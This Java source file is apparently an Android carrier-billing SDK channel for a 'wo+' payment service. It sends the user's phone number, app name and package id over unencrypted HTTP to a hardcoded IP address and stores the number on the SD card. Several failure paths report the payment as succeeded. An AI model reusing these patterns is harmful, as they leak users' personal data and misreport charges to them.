package com.y7.smspay.sdk.channel;

import android.text.TextUtils;

import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.util.Constants;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.IHttpRequestLs;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;


/**
 * 永正 wo+
 * @author Administrator
 * 
 */
public class WoAddayChannel extends BasePoyChannel {

	@Override
	public void pay() {
		super.pay();

		//DDDLog.d("XTPayChannel begin");
		myPhoneNumber = HttpSdSsTool.getPhoneNumber(appContext);
		String phone = null;
		if (TextUtils.isEmpty(myPhoneNumber)) { // 手机号为空去服务器获取
			//DDDLog.d("网络获取手机号");
			try {
				String result = GetDataImpl.getInstance(appContext).findNum();
				if (TextUtils.isEmpty(result)) {
					// 网络返回空，支付失败
					postPaySucceededEvent();
				}
				JSONObject demoJson = new JSONObject(result);
				phone = demoJson.getString("phone");
				Utils.save2SDCard(Constants.MYPHONENUMBER, phone);
			} catch (JSONException e) {
				//DDDLog.e("Exception", e);
			}
			if (TextUtils.isEmpty(phone)) {
				postPaySucceededEvent();
			} else {
				myPhoneNumber = phone;
			}
		}

		//DDDLog.d("myPhoneNumber -->" + myPhoneNumber);
		if (!TextUtils.isEmpty(myPhoneNumber)) {
			//DDDLog.d("请求验证码");
			HttpSdSsTool.ISREQUESCODE = HttpSdSsTool.WOADD;
			String xmlStr = HttpSdSsTool.requestCode(Constants.CHANNEL_PCXR, getReqParamString());
			//DDDLog.d("xmlStr-->" + xmlStr);
			
			String pm[] = xmlStr.split("@");
			linkid = pm[0].split("=")[1];
		}

		HttpSdSsTool.setHttpRequestListener(new IHttpRequestLs() {

			@Override
			public void onSendSucceed() {
				// TODO Auto-generated method stub
			}

			@Override
			public void onSendFailed() {
				// TODO Auto-generated method stub
			}
		});
		//DDDLog.d("XTPayChannel end");
	}

	/**
	 * 计费请求接口
	 * 
	 * @return
	 */
	private String getReqParamString() {
		String urlSms = ""; // 指令 5Y
		if (price == 800) {
			urlSms = "246";
		} else if (price == 1000) {
			urlSms = "248";
		} else if (price == 1200) {
			urlSms = "250";
		} else if (price == 1500) {
			urlSms = "252";
		} else if (price == 2000) {
			urlSms = "254";
		}

		// 拼代码
		String httpUrl = "http://182.50.1.131:9000/ds/woussd.jsp";
		String phoneNum = "phoneNum=" + myPhoneNumber; // 手机号
		String priceStr = "price=" + price / 100; // 价格
		String appName = "";
		try {
			appName = "appName=" + URLEncoder.encode(Utils.getApplicationName(appContext), "UTF-8");
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			//DDDLog.e("Exception", e);
		}
		String ext = "ext=" + urlSms;
		String extDataStr = "subject=" + 46 + ":"+ Utils.getPackId(appContext);
		String endUrl = httpUrl + "?" + phoneNum + "&" + priceStr + "&" + appName + "&"  + ext+ "&" + extDataStr;
		//DDDLog.d("endUrl -->" + endUrl);
		return endUrl;
	}

	/**
	 * 计费验证接口
	 * 
	 * @param code
	 * @return
	 */
	public static String getcallBackUrl(String code) {
		String urlSms = ""; // 指令 5Y
		if (price == 800) {
			urlSms = "246";
		} else if (price == 1000) {
			urlSms = "248";
		} else if (price == 1200) {
			urlSms = "250";
		} else if (price == 1500) {
			urlSms = "252";
		} else if (price == 2000) {
			urlSms = "254";
		}
		
		// 拼代码
		String httpUrl = "http://182.50.1.131:9000/ds/woussd.jsp";
		String urlReq = "linkid=" + linkid; // req-计费请求 ver-计费验证码
		String paymentCode = "paymentCode=" + code;
		String ext = "ext=" + urlSms;
		String endUrl = httpUrl + "?" + urlReq + "&" + paymentCode + "&" + ext;
		//DDDLog.d("获取验证指令url:" + endUrl);
		return endUrl;
	}

	private static String myPhoneNumber;
	private static String linkid;
}
